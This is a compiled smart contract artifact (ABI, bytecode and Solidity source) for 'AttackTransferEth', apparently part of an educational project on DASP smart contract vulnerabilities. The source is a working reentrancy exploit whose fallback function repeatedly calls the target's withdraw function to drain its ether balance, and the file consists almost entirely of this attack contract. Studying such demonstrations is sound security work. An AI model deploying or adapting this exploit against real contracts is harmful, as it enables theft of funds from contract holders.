{
  "contractName": "AttackTransferEth",
  "abi": [
    {
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "name": "i",
          "type": "uint256"
        },
        {
          "indexed": false,
          "name": "balance",
          "type": "uint256"
        }
      ],
      "name": "LogAttack",
      "type": "event"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_count",
          "type": "uint256"
        },
        {
          "name": "_value",
          "type": "uint256"
        }
      ],
      "name": "attack",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x6080604052670de0b6b3a76400006001556001600255600060035534801561002657600080fd5b5060405160208061025b833981016040525160008054600160a060020a03909216600160a060020a03199092169190911790556101f3806100686000396000f3006080604052600436106100405763ffffffff7c0100000000000000000000000000000000000000000000000000000000600035041663e1fa7638811461011d575b6003805460010190819055604080519182523031602083015280517f4f84c2120581b6b923d11fc664f6c72831f0bbb75b65e0acd467c9110e8fce5b9281900390910190a1600254600354101561011b5760008054600154604080517f2e1a7d4d00000000000000000000000000000000000000000000000000000000815260048101929092525173ffffffffffffffffffffffffffffffffffffffff90921692632e1a7d4d9260248084019382900301818387803b15801561010257600080fd5b505af1158015610116573d6000803e3d6000fd5b505050505b005b34801561012957600080fd5b5061011b6004356024356002829055600181905560008054604080517f2e1a7d4d00000000000000000000000000000000000000000000000000000000815260048101859052905173ffffffffffffffffffffffffffffffffffffffff90921692632e1a7d4d9260248084019382900301818387803b1580156101ab57600080fd5b505af11580156101bf573d6000803e3d6000fd5b5050505050505600a165627a7a7230582034d91d137055da7e800a46fd705e4dc6dec582d6d6becb1ab0e6ab126e649d2c0029",
  "source": "pragma solidity ^0.4.25;\n\nimport './TransferEth.sol';\n\ncontract AttackTransferEth {\n\n    TransferEth teth;\n    uint256 value = 1000000000000000000;\n    uint256 count = 1;\n    uint256 i =0;\n\n    event LogAttack(uint256 i, uint256 balance);\n\n    constructor(address _addr) public {\n        teth = TransferEth(_addr);\n    }\n\n    function () public payable{\n        i++;\n        LogAttack(i, this.balance);\n        if (i < count) teth.withdraw(value);\n\n    }\n\n    function attack(uint256 _count, uint256 _value) {\n        count = _count;\n        value = _value;\n        teth.withdraw(value);\n    }\n}",
  "sourcePath": "/Users/ahmed/Documents/github_projects/AwesomeSCSecurity/dasp/1-reentrancy/contracts/AttackTransferEth.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "2.0.1",
  "updatedAt": "2018-11-12T09:14:18.112Z"
}